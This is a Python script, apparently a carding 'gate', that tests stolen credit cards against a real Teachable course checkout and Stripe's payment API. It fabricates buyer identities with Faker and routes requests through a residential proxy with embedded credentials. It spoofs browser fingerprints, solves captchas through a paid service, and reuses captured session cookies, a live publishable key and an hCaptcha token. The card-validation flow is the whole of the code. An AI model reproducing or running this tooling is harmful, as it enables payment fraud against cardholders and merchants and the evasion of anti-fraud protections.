import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
            cliente.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = {
                'authority': 'keolafit.teachable.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                # 'cookie': '_gid=GA1.2.491991470.1742350793; _hp2_ses_props.318805607=%7B%22ts%22%3A1742350792997%2C%22d%22%3A%22checkout.teachable.com%22%2C%22h%22%3A%22%2Fsecure%2F829117%2Fcheckout%2Forder_35qhzcgr%22%7D; _afid=3d264519-fb71-4fb0-b6db-33548ae8b18c; aid=3d264519-fb71-4fb0-b6db-33548ae8b18c; fs_uid=#GVKP#e45f0ea2-74f3-4f72-8780-daa55567dbbe:cd66c1e5-d3ad-4730-b939-d46fceedc9a8:1742350834974::1#/1773886836; fs_lua=1.1742351056994; _vwo_uuid_v2=DA644CD4E668E2F9341F3B725E22DFCC5|4b3bc957ea954aa005075f7f8c71536b; _vwo_uuid=DA644CD4E668E2F9341F3B725E22DFCC5; _vwo_ds=3%241742351294%3A30.01926489%3A%3A; _gcl_au=1.1.1389800224.1742351294; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vis_opt_exp_85_combi=2; IR_gbd=teachable.com; _ga=GA1.1.1395922776.1742350793; _biz_uid=810ea93c2616483fe16b28b80647674a; _fbp=fb.1.1742351294069.539487505926417534; _biz_ABTestA=%5B55509%5D; teCookieSettings={%22enableSettings%22:false}; _biz_flagsA=%7B%22Version%22%3A1%2C%22ViewThrough%22%3A%221%22%2C%22XDomain%22%3A%221%22%7D; cebs=1; _ce.clock_data=-925%2C187.252.251.170%2C1%2C3357fadb0316939352bbdd4d5360a97f%2CChrome%2CMX; _vis_opt_exp_85_goal_3=1; _vis_opt_exp_85_goal_12=1; _vis_opt_exp_85_goal_8=1; _vis_opt_exp_85_goal_10=1; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22f3a609da-5ade-4e59-98f0-38a6f2fe0400%22; _vis_opt_exp_85_goal_11=1; pscd=partnerstack.teachable.com; __zlcmid=1QknTVSRTCVozv1; teCookieConsent={%22consentGiven%22:false%2C%22consentDate%22:%222025-03-19T02:30:38.431Z%22%2C%22allowAdvertising%22:true%2C%22version%22:%220.0.3%22}; _vwo_sn=0%3A6%3A%3A%3A1; IR_12646=1742351438518%7C0%7C1742351438518%7C%7C; _biz_nA=7; _biz_pendingA=%5B%5D; cebsp_=4; _uetsid=cf2b22a0046911f0925dc10a2577e779; _uetvid=cf2b6340046911f084bfa3a0cd026bc6; ahoy_visitor=180bebab-0fa6-4017-950b-7d7e704d1363; ahoy_visit=8c1bdf5d-39b1-41d3-801e-d80962d09fd4; ahoy_track=true; site_preview=logged_out; _session_id=e2199dcea903e566448b977ce7d590fe; __cf_bm=YdjhuWrRTP_nwiwCTWUbU5CWyrPP9n_1DJkM5vyCubY-1742351456-1.0.1.1-ir2J6TIAee7p8nc4u6ediIuKLMXDQ2lp_GqMQr5Tz4xTXkUs1Zlet4AqMl_XVaH0nA_aZHRhZj_u1v4HyaYhaHEc74i1vVP8.AwX2uA790c; _cfuvid=j_rJ3DD42BwiX3bHv_CDHgzvckAnpNDR0xDM0WGVnZs-1742351456439-0.0.1.1-604800000; _ga_6E9Q4KD1X0=GS1.1.1742351293.1.1.1742351455.31.0.0; _ce.s=v~7d25f86b83049c951c485215195a9be32d7e43eb~lcw~1742351455437~vir~new~lva~1742351294564~vpv~0~v11.fhb~1742351295160~v11.lhb~1742351438739~v11.cs~425358~v11.s~cfb9c1a0-0469-11f0-951f-a35442d3603d~v11.sla~1742351455483~v11.send~1742351454725~lcw~1742351455483; cf_clearance=ZY8FyDPuIclXFP9yttcllP2PzR8c2hcUt9rPSibpCR8-1742351457-1.2.1.1-OUDRlXQa5eSjXwRbTX.xLZDmT3PFCGAOMfYsxbXtjfUwNFkNnWrGir6iVR_h4zz9FCzlzp.5h6fp5cJAdhdPeofKx8J6vcVpaNQuZzzGZW8RqPfBJMoubX6.MkJ9.82bNiqJGNFOk9TXTs9ksEZR_1VRjySOJGDBl.ISHi0BXicZBfBhvXNXDKk4KpyHpnyiLLsAhvxbrrwtSRYfZsLp1SxPelJKORMtf11q7zu65oyhbSOpAoprDj0bGT127ybSQh6ng6CqygBEId_Sec2PlOEB7vcqxybQ7yfvlif.9SKtHvrJSeDF1CZFU3Co.OMU2G1UdkMXWlFUIeV5Tm_vOhi0PNRV0lEd9UMJwUdQcmg; __ssid=7b97b8b25693c8f11a28abec270389d; _ga_SL8LSCXHSV=GS1.1.1742351455.1.1.1742351468.0.0.0; _hp2_id.318805607=%7B%22userId%22%3A%221625465792260130%22%2C%22pageviewId%22%3A%227816075094021138%22%2C%22sessionId%22%3A%221877862759127187%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; __cfruid=674ca663e59b4d7db7d4b6d45cc0e3ebad149bd6-1742351469; __stripe_mid=6977470e-dfe1-4eab-9fbe-7d7d568dc4db672912; __stripe_sid=2ccc0d8b-9e9e-46f1-8f35-ce8c6c2e0e38462b78',
                'referer': 'https://keolafit.teachable.com/p/keola-fit-and-fiery-membership',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'product_id': '5084066',
            }

            response = cliente.get('https://keolafit.teachable.com/purchase', params=params,  headers=headers)

            # Verifica que la solicitud fue exitosa
            if response.status_code == 200:
                # Parsear la respuesta HTML con BeautifulSoup
                soup = b(response.text, 'html.parser')
                
                # Buscar en los scripts para obtener el token (usando regex)
                script_text = soup.find("script", string=re.compile(r'order_\w+'))
                
                if script_text:
                    # Extraer el order_token con regex
                    match = re.search(r'order_\w+', script_text.string)
                    order_token = match.group(0) if match else None
                else:
                    order_token = None

                # Imprimir el order_token
                print("Order Token:", order_token)
            else:
                print("Error al realizar la solicitud:", response.status_code)
            headers = {
                'authority': 'sso.teachable.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                # 'cookie': '_gid=GA1.2.491991470.1742350793; _hp2_ses_props.318805607=%7B%22ts%22%3A1742350792997%2C%22d%22%3A%22checkout.teachable.com%22%2C%22h%22%3A%22%2Fsecure%2F829117%2Fcheckout%2Forder_35qhzcgr%22%7D; ahoy_visitor=3d264519-fb71-4fb0-b6db-33548ae8b18c; ahoy_visit=b4fb83b9-e421-4437-b2bc-206fcc802230; ahoy_track=true; _afid=3d264519-fb71-4fb0-b6db-33548ae8b18c; aid=3d264519-fb71-4fb0-b6db-33548ae8b18c; site_preview=logged_out; _session_id=36193e043eb1f4d8f5cac46cf3b0bb38; fs_uid=#GVKP#e45f0ea2-74f3-4f72-8780-daa55567dbbe:cd66c1e5-d3ad-4730-b939-d46fceedc9a8:1742350834974::1#/1773886836; fs_lua=1.1742351056994; _vwo_uuid_v2=DA644CD4E668E2F9341F3B725E22DFCC5|4b3bc957ea954aa005075f7f8c71536b; _vwo_uuid=DA644CD4E668E2F9341F3B725E22DFCC5; _vwo_ds=3%241742351294%3A30.01926489%3A%3A; _gcl_au=1.1.1389800224.1742351294; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vis_opt_exp_85_combi=2; IR_gbd=teachable.com; _ga=GA1.1.1395922776.1742350793; _biz_uid=810ea93c2616483fe16b28b80647674a; _fbp=fb.1.1742351294069.539487505926417534; _biz_ABTestA=%5B55509%5D; teCookieSettings={%22enableSettings%22:false}; _biz_flagsA=%7B%22Version%22%3A1%2C%22ViewThrough%22%3A%221%22%2C%22XDomain%22%3A%221%22%7D; cebs=1; _ce.clock_data=-925%2C187.252.251.170%2C1%2C3357fadb0316939352bbdd4d5360a97f%2CChrome%2CMX; _vis_opt_exp_85_goal_3=1; _vis_opt_exp_85_goal_12=1; _vis_opt_exp_85_goal_8=1; _vis_opt_exp_85_goal_10=1; teachable_login_wizard=FSsKK6kxAYH8tyTji9n0HkMuVsqMOTaY_yBwJ3BhnzAdRQrT67Ql17BQ0VkiSWM9bfhY3uyn0pHW4WXJfzrrfQ; __spdt=05d85eb5855942f9bf9e6ae3a6baaf7a; _omappvp=jZtrDxxGZajsmjBa3pK03tQEVzuZ2hFu6PMw4SUdiaBxyAFfKR8I7SA59owIXO4DgvNkumds7DKB37RJZtOLdwgUpxpS5FIV; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22f3a609da-5ade-4e59-98f0-38a6f2fe0400%22; _vis_opt_exp_85_goal_11=1; pscd=partnerstack.teachable.com; teCookieSettings={%22enableSettings%22:false}; __zlcmid=1QknTVSRTCVozv1; _omappvs=1742351435810; teCookieConsent={%22consentGiven%22:false%2C%22consentDate%22:%222025-03-19T02:30:38.431Z%22%2C%22allowAdvertising%22:true%2C%22version%22:%220.0.3%22}; _vwo_sn=0%3A6%3A%3A%3A1; IR_12646=1742351438518%7C0%7C1742351438518%7C%7C; _biz_nA=7; _biz_pendingA=%5B%5D; cebsp_=4; _uetsid=cf2b22a0046911f0925dc10a2577e779; _uetvid=cf2b6340046911f084bfa3a0cd026bc6; __cf_bm=YdjhuWrRTP_nwiwCTWUbU5CWyrPP9n_1DJkM5vyCubY-1742351456-1.0.1.1-ir2J6TIAee7p8nc4u6ediIuKLMXDQ2lp_GqMQr5Tz4xTXkUs1Zlet4AqMl_XVaH0nA_aZHRhZj_u1v4HyaYhaHEc74i1vVP8.AwX2uA790c; _cfuvid=j_rJ3DD42BwiX3bHv_CDHgzvckAnpNDR0xDM0WGVnZs-1742351456439-0.0.1.1-604800000; _ga_6E9Q4KD1X0=GS1.1.1742351293.1.1.1742351455.31.0.0; _ce.s=v~7d25f86b83049c951c485215195a9be32d7e43eb~lcw~1742351455437~vir~new~lva~1742351294564~vpv~0~v11.fhb~1742351295160~v11.lhb~1742351438739~v11.cs~425358~v11.s~cfb9c1a0-0469-11f0-951f-a35442d3603d~v11.sla~1742351455483~v11.send~1742351454725~lcw~1742351455483; cf_clearance=ZY8FyDPuIclXFP9yttcllP2PzR8c2hcUt9rPSibpCR8-1742351457-1.2.1.1-OUDRlXQa5eSjXwRbTX.xLZDmT3PFCGAOMfYsxbXtjfUwNFkNnWrGir6iVR_h4zz9FCzlzp.5h6fp5cJAdhdPeofKx8J6vcVpaNQuZzzGZW8RqPfBJMoubX6.MkJ9.82bNiqJGNFOk9TXTs9ksEZR_1VRjySOJGDBl.ISHi0BXicZBfBhvXNXDKk4KpyHpnyiLLsAhvxbrrwtSRYfZsLp1SxPelJKORMtf11q7zu65oyhbSOpAoprDj0bGT127ybSQh6ng6CqygBEId_Sec2PlOEB7vcqxybQ7yfvlif.9SKtHvrJSeDF1CZFU3Co.OMU2G1UdkMXWlFUIeV5Tm_vOhi0PNRV0lEd9UMJwUdQcmg; __ssid=7b97b8b25693c8f11a28abec270389d; _ga_SL8LSCXHSV=GS1.1.1742351455.1.1.1742351468.0.0.0; _hp2_id.318805607=%7B%22userId%22%3A%221625465792260130%22%2C%22pageviewId%22%3A%227816075094021138%22%2C%22sessionId%22%3A%221877862759127187%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; __cfruid=b07ff31fcfb0aab213d99618f08d8a687df2b3c6-1742351481',
                'referer': 'https://keolafit.teachable.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'order_token': order_token,
                'product_id': '5084066',
            }

            response = cliente.get(
                'https://sso.teachable.com/secure/829117/checkout/5084066/basic',
                params=params,
                headers=headers,
            )

            headers = {
                'authority': 'checkout.teachable.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                # 'cookie': '_gid=GA1.2.491991470.1742350793; _hp2_ses_props.318805607=%7B%22ts%22%3A1742350792997%2C%22d%22%3A%22checkout.teachable.com%22%2C%22h%22%3A%22%2Fsecure%2F829117%2Fcheckout%2Forder_35qhzcgr%22%7D; teCookieSettings={%22enableSettings%22:false}; __stripe_mid=562bc40b-d7e4-4806-9773-6d5d70ce46d49406f9; __stripe_sid=c4e2a295-ebff-4d23-96c9-28e50e792e0c2781b7; _afid=3d264519-fb71-4fb0-b6db-33548ae8b18c; aid=3d264519-fb71-4fb0-b6db-33548ae8b18c; fs_uid=#GVKP#e45f0ea2-74f3-4f72-8780-daa55567dbbe:cd66c1e5-d3ad-4730-b939-d46fceedc9a8:1742350834974::1#/1773886836; fs_lua=1.1742351056994; _vwo_uuid_v2=DA644CD4E668E2F9341F3B725E22DFCC5|4b3bc957ea954aa005075f7f8c71536b; _vwo_uuid=DA644CD4E668E2F9341F3B725E22DFCC5; _vwo_ds=3%241742351294%3A30.01926489%3A%3A; _gcl_au=1.1.1389800224.1742351294; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vis_opt_exp_85_combi=2; IR_gbd=teachable.com; _ga=GA1.1.1395922776.1742350793; _biz_uid=810ea93c2616483fe16b28b80647674a; _fbp=fb.1.1742351294069.539487505926417534; _biz_ABTestA=%5B55509%5D; teCookieSettings={%22enableSettings%22:false}; _biz_flagsA=%7B%22Version%22%3A1%2C%22ViewThrough%22%3A%221%22%2C%22XDomain%22%3A%221%22%7D; cebs=1; _ce.clock_data=-925%2C187.252.251.170%2C1%2C3357fadb0316939352bbdd4d5360a97f%2CChrome%2CMX; _vis_opt_exp_85_goal_3=1; _vis_opt_exp_85_goal_12=1; _vis_opt_exp_85_goal_8=1; _vis_opt_exp_85_goal_10=1; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22f3a609da-5ade-4e59-98f0-38a6f2fe0400%22; _vis_opt_exp_85_goal_11=1; pscd=partnerstack.teachable.com; __zlcmid=1QknTVSRTCVozv1; teCookieConsent={%22consentGiven%22:false%2C%22consentDate%22:%222025-03-19T02:30:38.431Z%22%2C%22allowAdvertising%22:true%2C%22version%22:%220.0.3%22}; _vwo_sn=0%3A6%3A%3A%3A1; IR_12646=1742351438518%7C0%7C1742351438518%7C%7C; _biz_nA=7; _biz_pendingA=%5B%5D; cebsp_=4; _uetsid=cf2b22a0046911f0925dc10a2577e779; _uetvid=cf2b6340046911f084bfa3a0cd026bc6; _ga_6E9Q4KD1X0=GS1.1.1742351293.1.1.1742351455.31.0.0; _ce.s=v~7d25f86b83049c951c485215195a9be32d7e43eb~lcw~1742351455437~vir~new~lva~1742351294564~vpv~0~v11.fhb~1742351295160~v11.lhb~1742351438739~v11.cs~425358~v11.s~cfb9c1a0-0469-11f0-951f-a35442d3603d~v11.sla~1742351455483~v11.send~1742351454725~lcw~1742351455483; cf_clearance=ZY8FyDPuIclXFP9yttcllP2PzR8c2hcUt9rPSibpCR8-1742351457-1.2.1.1-OUDRlXQa5eSjXwRbTX.xLZDmT3PFCGAOMfYsxbXtjfUwNFkNnWrGir6iVR_h4zz9FCzlzp.5h6fp5cJAdhdPeofKx8J6vcVpaNQuZzzGZW8RqPfBJMoubX6.MkJ9.82bNiqJGNFOk9TXTs9ksEZR_1VRjySOJGDBl.ISHi0BXicZBfBhvXNXDKk4KpyHpnyiLLsAhvxbrrwtSRYfZsLp1SxPelJKORMtf11q7zu65oyhbSOpAoprDj0bGT127ybSQh6ng6CqygBEId_Sec2PlOEB7vcqxybQ7yfvlif.9SKtHvrJSeDF1CZFU3Co.OMU2G1UdkMXWlFUIeV5Tm_vOhi0PNRV0lEd9UMJwUdQcmg; __ssid=7b97b8b25693c8f11a28abec270389d; _ga_SL8LSCXHSV=GS1.1.1742351455.1.1.1742351468.0.0.0; _hp2_id.318805607=%7B%22userId%22%3A%221625465792260130%22%2C%22pageviewId%22%3A%227816075094021138%22%2C%22sessionId%22%3A%221877862759127187%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; __cf_bm=.oWi6lCsYIVl1MYSfNeKfIuBG9d.h7xny8_FP67tOcY-1742351481-1.0.1.1-S_DkX8NrSpWnIiXUZfSZp5rGbVC18jU9AVZx0iGysUMmdvJVyEkwmuWX39r8Uh.MZ3j3AYL8Zci5uilZtNMtmb74ZFJ1bnDxRzXLY6hIa6Y; __cfruid=2df4002bc299ec835543164fd381cb68b1308d06-1742351481; _cfuvid=K4d1DdY.EVx2sv1ZSepL70.Qn02r0r7Qj38x7NyOWtE-1742351481818-0.0.1.1-604800000',
                'referer': 'https://keolafit.teachable.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            responseChk = cliente.get(
                f'https://checkout.teachable.com/secure/829117/checkout/{order_token}',
                headers=headers,
            )
            soup = b(responseChk.text, 'html.parser')
            print(soup)
            
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'billing_details[name]={name+last}&billing_details[email]={email}&billing_details[address][line1]=23+Allen+Street&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][postal_code]=10002&billing_details[address][state]=NY&billing_details[phone]=&type=card&card[number]={cc_number}&card[cvc]={cvv}&card[exp_year]={ano_number[-2:]}&card[exp_month]={mes}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2Fe22c2352fa%3B+stripe-js-v3%2Fe22c2352fa%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcheckout.teachable.com&time_on_page=60771&client_attribution_metadata[client_session_id]=b4944529-2558-4ff3-939e-d750763d4810&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=5bca1ccb-1a27-475f-93cd-5e1d0c4ed9a2755840&muid=d8e8a863-6416-49f6-a535-0e204bc7b9e4d0a123&sid=83da1fd1-e822-4d2b-b880-4e8f72afe8c9688b3d&key=pk_live_hkgvgSBxG4TAl3zGlXiB1KUX&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiSVBzTEh1dE1ZK2oyUkhKdXhzdGtEVkp2dGpwMFp0MzFEQk5DNklMU0U4UDc5V0l1TVhCcmZTODhOK0tVZEwvUElvaTFKZ2lnK3lDNFdSRFI1MHlWd0EwRGNIRFEyMld4R2oxMERVajRJTnphWVpTdHl5MWYyTFBEcWs3QmsxcVNPenZSazRBZlVKV01wL2o3T3ZhSjl2VHFpYUtkbVlmM2xEUWVhL1RZeVdTNFFWMUdyYkdWWWtaVDdwWFNoOHFneC9leGhBTTgraldhNkFuNUtrQUcza2N3NDdLc1I4S0lxTHNHUlpvTUdBK3c2SHVHR1JJSUp5RVp3SFYzMkN1bEN1VWRpVEVUbngyUXpqS3BpVklVcUpJUGJzaWpFTnprcXdGaG5KQXkydTZ5TUh3dTNycUJlSHJWdnNyemRsdExZZW95WVJST3FFaVBIN2p4NzVzeUxNeVZuS0tkRWJmOXJPWUl6aERqT3FXN0Zqa0o0WVNOYXhDY1BSdWFlTFZFU0NZSERtK1IyR216bDhBTmR3QmxMb1VLbmVxNkdOV3hORzR3MVpJQ0N5bVZSQWt0cFF6VjEveGxtOS9GT2RQcHR2WnNlUWU5YVkrd1RickMwZGFDZkVaWC9DN2t0eXRjcUVTUVlXR2VBWWtqOVZMTk1IZ08xZWhVdzliWkZXcGJsczlTQ2NPSE80N0hHQjQzMU00bGExTUFkRlUrVUo0b3hTVU5vakxNcnlzcXJacEZseEJVODN6OE52TGV4eVR5ZHZkSGFXNkhYS1JxaEpBU1Nvb1JmVkdNQms1T0lra1ZXTDJTZlU1ZTAzLy8wUUwwNFAyS3RTZ2JIcVpSS2JaT1FBWURCdjdIWTJnYzV6YjVUTTkvRGFGZjdXZnBodFkxd290SmlzODh6dXNpVkMvVEg0M1NwSHpEZzUrMGJ2ZmNCYkdua1BYdksybFN0UU1lZDB1UVhsKzY1WGwxSXNMbTloQWgvMllPcitsS2FUMDFwLzVSQnkvcU9OSzZzSHNrQWtpcUtpRFo4dDViOFEwVEdrdWFScWhQQTNkem1NcXJpNWJVRERSSXBhaFAybzVIM2hUTWtmRDNHUjcxa1V2ZmduVUVkenJ1MnZxYjc1Qi81OG5NOWpsVmYyTVdqSGVRTytDdmdsRVJJMVhMd2xlUHR1UGdwbXArSVYydkhhdk1BMDY2d0dVSVBVUEVXM2w2czFmRmxoOTE1L0pyR1I5K3pEYTRYQUw4bkFoeHFJdjZzWk1YUzNJbVp4MWQ3bTZsejFrbkU4RDhRVEg3TXdncmVxZlFoenZPdVBuT3hvUDJXYXBvZE5TRXpmck1NY3FBTWtaakdGSFdSTDRxcStaUFVrd25kWDVoQnUxaVkxWk82L0czdXM5ZVZUWE95R0hjTGsxMXpaRmZsS1M0dDFvYzU5ZFdpYjQyQWx4bUpLZWlCSXYvL1M4cTZQZStFelhqcEtDM0V0bVl0NUVwVmRNREN2YWdLUnUrSXNCM3ozWitodGdMbmV1L0c0N3FCS0dGYUVWdXlUVnIwaWJpYUU3Tk5mbjg4VUx3UzMvYkRqWnRTM1J1UDNYTTRTUXpzWmh0dEJHSzU5MVJheUhnb1E3VmlqenpHTWd2dk9pN3gxSWE0Qk5VbU96WW9JbkNiVGRVYUI4L0dVdHc4UnB2cEF5MTVRZjFJU2tzeXh5azM5MURqZFJhRWxpVHpBemQ3bTBHdVd3L2NUNFRaOU0vUmozQngyQlQ5U3RWS2FLZWZ1Tkd4bzU0SHJWNUNvaUR3bXg0MVlKeithNXliekNMbG9DWG9DTm9ycmpFd1FIbHpPbm8yYTdsOXJocEdNM2RmVW81YVY2UU1Qb2w2Wkhnbk1MdVE4NkRDUncvcG53cGdPN0dvaS9rQktxOUlwYk13ZHNHR0FuSk5OTGNjQTM3WEVndmpENTRoZmFmU0VsQ1gwTnYvWmlDQUVOMy9vS254akx1S0pFQlJJa09xR0tjeUxzUVgwWTc5MFZEeTdhdWhBdU15TjRnVFVNWHBEbS9IcklDczF1ekFzc1dZQkRLZEFscndOMTlWV0tabENqcnRyODcxV0lKcTd2T0NRMzJNNW1pRlM3bm83MS9JSis4bGRJSHZORTBjZm1ZdVh6SHpudm95bEMxc3U3RXUrTDk4UFNtMHJGdWZxVERlNjBhY2NFY2F3M21XUmluRlQ4anJmSkFCYXRXaVVnWGhqT2JkbnJwaVphYlBJMTh2VWgybnlod0JHaGRKcHhoRlZTdkYvT1phTWdaM2sxMHUxbFhBcmh2Qm8vMVRQZ3ZGY1NGdlF1dFh6SU5Mak9jM25OemJJalg3dS9JL0tKSElFa1RBQTBxdkt5aFRJeWkzOGxYWHdqZHo3Yk50THZ0SnAzSjRONUM4MjRCWmFOS3pITERvZE1uUUpkWi81VGJlVFp2NHZFY1RETXVIYmx6aUtvbTRCZ0x6WjJKQ1JoZ1JNSHJWTHdjUzhIdHZleHdLdlUyRWI5RThocEhKQ2sxUjdyNytCaGYrbUFRdkNScCtiUUtGb21kYnBVY3hXZ1hlMFZLdUtBOGl4NlROb3l3dHBWOFllNDh0V01rREtuWks1N0toMUkwRlZyaUk0VHA2V3VtQm1uZDMzVXVFYnRzWDhONVlOc05BaHNWallpeW91TFR1ZlNZS1pqU0l0bHh5K2ozY0dHV0V0ZVlWcmpvNnFmN09wa1VVM0ZxV1lsZW91VXBPOTA1ekMxdU9MYXZDTHVuUjJtcWQyaWowbDYyZk5WMVJSWHZQUTgrUnMyRi9JRmxxaEpobWhhd2J2UlRadGxseFk3TnpvS1RWZElZeEs2UGFpcDBLVXNmbkZpVm9rVi9FQ2NjTU5CaE5kOGJBY2lmSmx4a1lDRDBJVU1tZ1gwQ1RmY2VYSW1hNWg4TUpCVTZKTGhHZlM3K3lUVUlHT1lvNlRHMEltcnlJaHVnOUxjUTgzTlcyTHhMOFlmMGhPV2hqRlRyM2lNWlpnT1FSNDFIeUVZVHNhb1lYeElTL0dMc3Y3VW1zeVllUmp6WmtsdHhQdHpBM2xmWjJFTEUybXYzY3l4T3Nia2QrMXEwcHlQTzBhcE5WSFU4U1p0NDRRdG9MMlVhMTVDaTJrU1huQ0g3TDhKNCIsImV4cCI6MTc0MjM1MjIxNiwic2hhcmRfaWQiOjIyMTk5NjA3Mywia3IiOiIyZmQ2MTVhZCIsInBkIjowLCJjZGF0YSI6IkRkSHAxK1FvbmR2MDBUeWlsQ2hNdXRYdHg5cHJ4UDBRZkEwck1kdjlrbWxhSm5CTCt0U1NZM0cwZXFuZDFVZW1BTkFSWUpYbDRySGVCYkdobFRuMmcybmtGaVVURUNJRlF1eXlXVGQvaVdaOElBdkVWREJoVkR4eXA4ZTUrS0RaaFllWlREaS9pRW5MZ3ZpNm9YbDBDb3VDVzJEYUR0V3l3NFRYWjZYOVUrejl5S08yRU5IRTlqdlFPYlZuYnhES3JRb1IzOE5sRnpqSnd0QjIifQ.FEFbq_66e99LcuwW_HFkHdPwCI7vUkdD2WTfPlrZ258'

            response = cliente.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            responsePm = json.loads(response.text)
            #print(responsePm)
            token = responsePm['id']
            created = responsePm['created']
           # print(token)
           # print(created)
